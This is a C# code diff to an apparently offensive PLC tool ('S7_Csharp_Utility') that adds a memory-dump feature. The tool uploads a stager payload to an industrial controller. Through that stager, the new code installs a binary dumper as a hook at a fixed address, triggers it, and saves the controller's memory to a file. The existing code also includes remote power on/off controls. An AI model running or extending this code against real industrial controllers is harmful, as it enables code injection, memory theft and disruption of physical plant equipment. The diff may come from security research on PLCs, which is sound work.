@@ -5,12 +5,15 @@ using System.IO;
 using System.Net.Sockets;
 using System.Threading.Tasks;
 using Modbus.Device;
+using System.Globalization;
+using System.Diagnostics;
 
 namespace S7_Csharp_Utility
 {
     public partial class MainWindow : Window
     {
         private readonly PlcCommunicator _plc;
+        private bool _stagerInstalled = false;
 
         // Control references
         private TextBox PlcHostTextBox;
@@ -23,6 +26,14 @@ namespace S7_Csharp_Utility
         private Button PowerOnButton;
         private Button PowerOffButton;
         private Button UploadStagerButton;
+        private TextBox DumpAddressTextBox;
+        private TextBox DumpLengthTextBox;
+        private Button DumpMemoryButton;
+        private ProgressBar DumpProgressBar;
+        private TextBlock DumpPercentLabel;
+        private TextBlock DumpBytesLabel;
+        private TextBlock DumpTimeLabel;
+
 
         public MainWindow()
         {
@@ -39,6 +50,13 @@ namespace S7_Csharp_Utility
             PowerOnButton = this.FindControl<Button>("PowerOnButton");
             PowerOffButton = this.FindControl<Button>("PowerOffButton");
             UploadStagerButton = this.FindControl<Button>("UploadStagerButton");
+            DumpAddressTextBox = this.FindControl<TextBox>("DumpAddressTextBox");
+            DumpLengthTextBox = this.FindControl<TextBox>("DumpLengthTextBox");
+            DumpMemoryButton = this.FindControl<Button>("DumpMemoryButton");
+            DumpProgressBar = this.FindControl<ProgressBar>("DumpProgressBar");
+            DumpPercentLabel = this.FindControl<TextBlock>("DumpPercentLabel");
+            DumpBytesLabel = this.FindControl<TextBlock>("DumpBytesLabel");
+            DumpTimeLabel = this.FindControl<TextBlock>("DumpTimeLabel");
 
             _plc = new PlcCommunicator(Log);
 
@@ -46,6 +64,7 @@ namespace S7_Csharp_Utility
             PowerOnButton.Click += async (s, e) => await SetPower(true);
             PowerOffButton.Click += async (s, e) => await SetPower(false);
             UploadStagerButton.Click += UploadStagerButton_Click;
+            DumpMemoryButton.Click += DumpMemoryButton_Click;
         }
 
         private void Log(string message)
@@ -55,7 +74,6 @@ namespace S7_Csharp_Utility
             {
                 var timestamp = DateTime.Now.ToString("HH:mm:ss");
                 LogTextBlock.Text += $"[{timestamp}] {message}{Environment.NewLine}";
-                // Auto-scroll logic would go here if we had a ScrollViewer name
             });
         }
 
@@ -115,11 +133,11 @@ namespace S7_Csharp_Utility
 
                 await Task.Delay(50);
 
-                await RunFullSequenceAsync();
+                await RunStagerSequenceAsync();
             }
             catch (Exception ex)
             {
-                Log($"An error occurred during the sequence: {ex.Message}");
+                Log($"An error occurred during the stager sequence: {ex.Message}");
             }
             finally
             {
@@ -131,8 +149,9 @@ namespace S7_Csharp_Utility
             }
         }
 
-        private async Task RunFullSequenceAsync()
+        private async Task RunStagerSequenceAsync()
         {
+            _stagerInstalled = false;
             if (!int.TryParse(PlcPortTextBox.Text, out int port))
             {
                 Log("Error: Invalid PLC port.");
@@ -155,8 +174,107 @@ namespace S7_Csharp_Utility
                 Log($"Loaded stager payload ({stagerPayload.Length} bytes).");
 
                 await _plc.InstallStager(stagerPayload);
+                _stagerInstalled = true;
+                Log("Stager is installed and ready.");
             }
         }
+
+        private async void DumpMemoryButton_Click(object sender, Avalonia.Interactivity.RoutedEventArgs e)
+        {
+            if (!_stagerInstalled)
+            {
+                Log("Error: Stager is not installed. Please run 'Upload Stager' first.");
+                return;
+            }
+
+            if (!uint.TryParse(DumpAddressTextBox.Text.Replace("0x", ""), NumberStyles.HexNumber, CultureInfo.CurrentCulture, out uint address))
+            {
+                Log("Error: Invalid dump address. Must be a valid hex number (e.g., 0x10000000).");
+                return;
+            }
+            if (!uint.TryParse(DumpLengthTextBox.Text, out uint length) || length == 0)
+            {
+                Log("Error: Invalid dump length. Must be a positive number.");
+                return;
+            }
+
+            SetControlsEnabled(false);
+            try
+            {
+                await RunDumpSequenceAsync(address, length);
+            }
+            catch (Exception ex)
+            {
+                Log($"An error occurred during the dump sequence: {ex.Message}");
+            }
+            finally
+            {
+                SetControlsEnabled(true);
+            }
+        }
+
+        private async Task RunDumpSequenceAsync(uint address, uint length)
+        {
+            Log($"Starting memory dump of {length} bytes from 0x{address:X8}...");
+
+            // Reset progress UI
+            Dispatcher.UIThread.Post(() =>
+            {
+                DumpProgressBar.Value = 0;
+                DumpPercentLabel.Text = "0%";
+                DumpBytesLabel.Text = $"Read: 0 / {length} bytes";
+                DumpTimeLabel.Text = "Elapsed: 0s | Remaining: calculating...";
+            });
+
+
+            string dumperPath = Path.Combine(AppContext.BaseDirectory, "payloads", "dump_mem", "build", "dump_mem.bin");
+            if (!File.Exists(dumperPath))
+            {
+                Log($"Error: Dumper payload not found at {dumperPath}");
+                return;
+            }
+            byte[] dumperPayload = await File.ReadAllBytesAsync(dumperPath);
+            Log($"Loaded dumper payload ({dumperPayload.Length} bytes).");
+
+            int dumperHookIndex = 0x1a;
+            await _plc.InstallAddHookViaStager(0x10010100, dumperPayload, dumperHookIndex);
+            Log("Memory dumper payload installed.");
+
+            var args = new byte[1 + 4 + 4];
+            args[0] = (byte)'A';
+            BitConverter.GetBytes(address).CopyTo(args, 1);
+            BitConverter.GetBytes(length).CopyTo(args, 5);
+
+            await _plc.InvokeAddHook(dumperHookIndex, args);
+            Log("Dump command sent. Receiving data...");
+
+            var stopwatch = Stopwatch.StartNew();
+            var progress = new Progress<long>(bytesRead =>
+            {
+                double percentage = (double)bytesRead / length * 100;
+                stopwatch.Stop();
+                double elapsedSeconds = stopwatch.Elapsed.TotalSeconds;
+                double bytesPerSecond = bytesRead / elapsedSeconds;
+                double remainingSeconds = (bytesPerSecond > 0) ? (length - bytesRead) / bytesPerSecond : 0;
+                stopwatch.Start();
+
+                Dispatcher.UIThread.Post(() =>
+                {
+                    DumpProgressBar.Value = percentage;
+                    DumpPercentLabel.Text = $"{percentage:F1}%";
+                    DumpBytesLabel.Text = $"Read: {bytesRead} / {length} bytes";
+                    DumpTimeLabel.Text = $"Elapsed: {elapsedSeconds:F0}s | Remaining: {remainingSeconds:F0}s";
+                });
+            });
+
+            var dumpedData = await _plc.ReceiveMany(progress);
+            stopwatch.Stop();
+
+            string outFilename = $"mem_dump_{address:x8}_{address + length:x8}.bin";
+            await File.WriteAllBytesAsync(outFilename, dumpedData);
+            Log($"Successfully dumped {dumpedData.Length} bytes to {outFilename} in {stopwatch.Elapsed.TotalSeconds:F1}s.");
+        }
+
 
         private void SetControlsEnabled(bool enabled)
         {
@@ -170,6 +288,9 @@ namespace S7_Csharp_Utility
             PowerOnButton.IsEnabled = enabled;
             PowerOffButton.IsEnabled = enabled;
             UploadStagerButton.IsEnabled = enabled;
+            DumpAddressTextBox.IsEnabled = enabled;
+            DumpLengthTextBox.IsEnabled = enabled;
+            DumpMemoryButton.IsEnabled = enabled;
         }
     }
 }
